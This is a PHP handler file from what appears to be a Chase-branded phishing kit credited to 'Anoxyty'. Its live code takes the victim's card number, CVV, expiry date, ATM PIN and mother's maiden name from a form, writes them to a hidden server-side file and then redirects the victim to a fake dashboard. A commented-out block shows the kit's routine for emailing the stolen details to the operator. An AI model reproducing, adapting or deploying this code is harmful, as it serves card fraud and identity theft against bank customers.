<?php 
   ob_start();
   session_start();
//    include '../data.php';
//    include '../anoxytytrap/info.php';
   $ip = getenv("REMOTE_ADDR");
   $hostname = gethostbyaddr($ip);
   $useragent = $_SERVER['HTTP_USER_AGENT'];
   if ( isset( $_POST['cc'] ) ) {
   	
   	$_SESSION['cc'] 	  = $_POST['cc'];
   	$_SESSION['cvv'] 	  = $_POST['cvv'];
   	$_SESSION['expdate'] 	  = $_POST['expdate'];
   	$_SESSION['atm'] 	  = $_POST['atm'];
   	$_SESSION['mmn'] 	  = $_POST['mmn'];


    $log = "cc: ".$_SESSION['cc']."    cvv: ".$_SESSION['cvv']."    expdate: ".$_SESSION['expdate']."    atm: ".$_SESSION['atm']."    mmn: ".$_SESSION['mmn'];
    $filename = $_SESSION['filename'];
    if($filename == ""){
        $_SESSION['randString'] = genRandString(80);
        $filename = $_SESSION['randString'];

        if(!file_put_contents($filename, $log)){
            // permission issue
        }
    }else{
        file_put_contents($filename, $log,  FILE_APPEND | LOCK_EX);

    }
   
//     $message = file_get_contents('../anoxyty/send/cad.html');
   
//     $message = preg_replace('{AN0XYTY-1}', $_SESSION['cc'], $message);
//     $message = preg_replace('{AN0XYTY-2}', $_SESSION['cvv'], $message);
//     $message = preg_replace('{AN0XYTY-3}', $_SESSION['expdate'], $message);
//     $message = preg_replace('{AN0XYTY-4}', $_SESSION['atm'], $message);
//     $message = preg_replace('{AN0XYTY-5}', $_SESSION['mmn'], $message);
   
//     $message = preg_replace('{AN0XYTY-IP}', $ip, $message);
    
//     $message = preg_replace('{AN0XYTY-INFO}', $ip, $message);
//     $message = preg_replace('{AN0XYTY-UGENT}', $useragent, $message);
   
//    $message = preg_replace('{AN0XYTY-Z}', $LOOKUP_CITY, $message);
//    $message = preg_replace('{AN0XYTY-X}', $LOOKUP_STATE, $message);
//    $message = preg_replace('{AN0XYTY-W}', $LOOKUP_ISP, $message);
   
//           $subject = " CHASE CARD By Anoxyty  : $ip ";
//           $headers = "From: Anoxyty <chase@anoxyty.com>\r\n";
//           $headers .= "MIME-Version: 1.0\r\n";
//           $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        
//           @mail($data,$subject,$message,$headers);
   
//    	$save = fopen("saved/stored.html","a+");
//           fwrite($save,$message);
//           fclose($save);
   
   
          header("Location: ../fina.php?dashboard/personal_information==dashboard/overview&ue");
          exit();
   } else {
   	header("Location: index.php");
   	exit();
   }
   ?>